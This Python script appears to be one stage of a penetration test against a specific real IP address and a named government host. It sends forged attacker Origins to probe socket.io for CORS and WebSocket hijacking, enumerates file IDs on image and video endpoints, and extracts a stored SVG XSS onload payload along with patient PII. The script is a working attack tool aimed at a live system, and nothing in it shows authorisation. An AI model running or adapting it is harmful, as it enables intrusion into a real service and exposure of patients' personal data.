#!/usr/bin/env python3
"""
Stage 6: socket.io CORS/CSWSH + :3100 二进制文件类型识别 + SVG XSS PoC
"""
import json
import subprocess
import time

def curl_capture(url, method="GET", body=None, headers=None, timeout=15, binary=False, raw=False):
    cmd = ["curl", "-sS", "-k", "-i", "-X", method, "-H", "User-Agent: Mozilla/5.0 (Pentest)"]
    if headers:
        for k, v in headers.items():
            cmd += ["-H", f"{k}: {v}"]
    if body:
        cmd += ["-H", "Content-Type: application/json", "-d", json.dumps(body)]
    cmd.append(url)
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=timeout)
        out = r.stdout
        # 解析 headers + body
        if b"\r\n\r\n" in out:
            hdrs = out.split(b"\r\n\r\n")[0].decode("latin-1", "replace")
            bod = out.split(b"\r\n\r\n", 1)[1]
            return hdrs, bod
        return out.decode("latin-1", "replace"), b""
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]", b""
    except Exception as e:
        return f"[ERR {e}]", b""

def main():
    print(f"[*] Stage 6: socket.io CORS + 二进制文件识别 + SVG XSS PoC - {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"="*100)

    # ===== Step 1: socket.io CORS + Origin 反射 =====
    print("\n[STEP 1] :3100/socket.io CORS 测试")
    origins = [
        "https://attacker.example",
        "https://evil.example.com",
        "http://localhost",
        "http://35.234.50.28",
        "http://epcr.tpf.gov.tw",
        "null",
        "",
    ]
    for origin in origins:
        cmd = ["curl", "-sS", "-k", "-o", "-", "-D", "-",
               "-H", f"Origin: {origin}",
               "-H", "User-Agent: Mozilla/5.0",
               "http://35.234.50.28:3100/socket.io/?EIO=4&transport=polling"]
        try:
            r = subprocess.run(cmd, capture_output=True, timeout=15)
            resp = r.stdout.decode("latin-1", "replace")
            acao = "Access-Control-Allow-Origin:"
            if acao in resp:
                for line in resp.split("\n"):
                    if acao in line or "allow-credentials" in line.lower():
                        print(f"  [CORS] Origin={origin:40s} → {line.strip()}")
            else:
                # 提取 status line + 第一段 body
                status = resp.split("\n")[0].strip() if resp else "EMPTY"
                body_start = resp.split("\r\n\r\n", 1)[1][:80] if "\r\n\r\n" in resp else ""
                print(f"  [NO ACAO] Origin={origin:40s} → {status}  body={body_start}")
        except Exception as e:
            print(f"  [ERR] Origin={origin} → {e}")

    # ===== Step 2: socket.io WebSocket upgrade =====
    print("\n[STEP 2] :3100/socket.io WebSocket upgrade")
    cmd = ["curl", "-sS", "-k", "-i",
           "-H", "Connection: Upgrade",
           "-H", "Upgrade: websocket",
           "-H", "Sec-WebSocket-Version: 13",
           "-H", "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==",
           "-H", "Origin: https://attacker.example",
           "http://35.234.50.28:3100/socket.io/?EIO=4&transport=websocket"]
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=10)
        out = r.stdout.decode("latin-1", "replace")[:400]
        print(f"  WS upgrade 响应: {out}")
    except Exception as e:
        print(f"  [WS 升级失败] {e}")

    # ===== Step 3: :3100 二进制文件类型识别 =====
    print("\n[STEP 3] :3100/imageData/getFile 二进制文件类型 (fileId=21,23-27,31-34,37)")
    # 用 -r 0-15 截取前 16 字节做文件签名识别
    binary_fids = [21, 23, 24, 25, 26, 27, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 99, 100, 500, 1000]
    for fid in binary_fids:
        # 获取 Content-Length + 前 16 字节
        cmd = ["curl", "-sS", "-k", "-o", "/tmp/probe3100.bin", "-D", "/tmp/probe3100.hdr",
               "-H", "User-Agent: Mozilla/5.0",
               f"http://35.234.50.28:3100/imageData/getFile/{fid}"]
        try:
            r = subprocess.run(cmd, capture_output=True, timeout=15)
            with open("/tmp/probe3100.hdr", "rb") as f:
                hdrs = f.read().decode("latin-1", "replace")
            with open("/tmp/probe3100.bin", "rb") as f:
                body = f.read()
            status_line = hdrs.split("\n")[0].strip() if hdrs else "EMPTY"
            ct = ""
            cl = ""
            for line in hdrs.split("\n"):
                if "Content-Type:" in line:
                    ct = line.split(":", 1)[1].strip()
                if "Content-Length:" in line:
                    cl = line.split(":", 1)[1].strip()
            # 识别文件签名
            magic = ""
            sig = ""
            if body[:3] == b"\xff\xd8\xff":
                magic = "JPEG"
            elif body[:4] == b"\x89PNG":
                magic = "PNG"
            elif body[:4] == b"GIF8":
                magic = "GIF"
            elif body[:2] == b"BM":
                magic = "BMP"
            elif body[:4] == b"RIFF" and body[8:12] == b"WEBP":
                magic = "WEBP"
            elif body[:4] == b"%PDF":
                magic = "PDF"
            elif body[:2] in [b"PK", b"7z\xbc", b"Rar"]:
                magic = "ZIP/7Z/RAR"
            else:
                sig = body[:8].hex()
            print(f"  fileId={fid:5d}  status={status_line}  CT={ct}  CL={cl}  magic={magic}  sig={sig}")
        except Exception as e:
            print(f"  [ERR] fileId={fid} → {e}")

    # ===== Step 4: :3100/videoData 二进制响应探测 =====
    print("\n[STEP 4] :3100/videoData/getFile 二进制响应探测")
    for fid in [500, 1000, 5000, 9999]:
        cmd = ["curl", "-sS", "-k", "-o", "/tmp/probe3100_vid.bin", "-D", "/tmp/probe3100_vid.hdr",
               f"http://35.234.50.28:3100/videoData/getFile/{fid}"]
        try:
            r = subprocess.run(cmd, capture_output=True, timeout=15)
            with open("/tmp/probe3100_vid.hdr", "rb") as f:
                hdrs = f.read().decode("latin-1", "replace")
            with open("/tmp/probe3100_vid.bin", "rb") as f:
                body = f.read()
            status_line = hdrs.split("\n")[0].strip() if hdrs else "EMPTY"
            ct = ""
            cl = ""
            for line in hdrs.split("\n"):
                if "Content-Type:" in line:
                    ct = line.split(":", 1)[1].strip()
                if "Content-Length:" in line:
                    cl = line.split(":", 1)[1].strip()
            magic = ""
            sig = ""
            if body[:3] == b"\xff\xd8\xff":
                magic = "JPEG"
            elif body[:4] == b"\x89PNG":
                magic = "PNG"
            elif body[:4] == b"GIF8":
                magic = "GIF"
            elif body[:4] == b"RIFF" and body[8:12] == b"WEBP":
                magic = "WEBP"
            elif body[:8] == b"\x00\x00\x00\x20ftyp":
                magic = "MP4"
            else:
                sig = body[:16].hex()
            print(f"  fileId={fid:5d}  status={status_line}  CT={ct}  CL={cl}  magic={magic}  sig={sig}")
        except Exception as e:
            print(f"  [ERR] fileId={fid} → {e}")

    # ===== Step 5: :3100/trendings, /events 集合的元数据 =====
    print("\n[STEP 5] :3100/trendings, /events 元数据抽查")
    for path in ["/trendings", "/events", "/trendings/1", "/events/1", "/trendings/100", "/events/100"]:
        cmd = ["curl", "-sS", "-k", "-o", "/tmp/probe3100_meta.json", "-D", "/tmp/probe3100_meta.hdr",
               f"http://35.234.50.28:3100{path}"]
        try:
            r = subprocess.run(cmd, capture_output=True, timeout=15)
            with open("/tmp/probe3100_meta.hdr", "rb") as f:
                hdrs = f.read().decode("latin-1", "replace")
            with open("/tmp/probe3100_meta.json", "rb") as f:
                body = f.read()
            status_line = hdrs.split("\n")[0].strip() if hdrs else "EMPTY"
            ct = ""
            for line in hdrs.split("\n"):
                if "Content-Type:" in line:
                    ct = line.split(":", 1)[1].strip()
            try:
                j = json.loads(body)
                if isinstance(j, list):
                    print(f"  {path:30s} {status_line}  CT={ct}  records={len(j)}")
                else:
                    print(f"  {path:30s} {status_line}  CT={ct}  fields={list(j.keys())}")
            except Exception:
                print(f"  {path:30s} {status_line}  CT={ct}  body={body[:80]}")
        except Exception as e:
            print(f"  [ERR] {path} → {e}")

    # ===== Step 6: SVG XSS 完整 PoC 提取 =====
    print("\n[STEP 6] SVG XSS PoC - 提取 onload 处理器 + PII 上下文")
    cmd = ["curl", "-sS", "-k", "-r", "0-1999",
           "http://35.234.50.28:3100/imageData/getFile/1"]
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=30)
        body = r.stdout.decode("utf-8", "replace")
        # 提取 <script> 块
        if "<script" in body:
            print(f"  [SCRIPT] 提取 <script> 内容:")
            idx = body.find("<script")
            end = body.find("</script>", idx)
            if end > 0:
                print(f"    {body[idx:end+9][:600]}")
        # 提取 onload 处理器
        if "onload=" in body:
            idx = body.find("onload=")
            end = body.find('"', idx + 9)
            print(f"  [ONLOAD] onload 处理器: {body[idx:end+1]}")
        # 提取 <title> <desc>
        for tag in ["<title>", "<desc>", "patient", "180717152801", "fed7"]:
            if tag in body:
                idx = body.find(tag)
                print(f"  [PII/META] {tag}: context={body[idx:idx+200]}")
    except Exception as e:
        print(f"  [下载失败] {e}")

if __name__ == "__main__":
    main()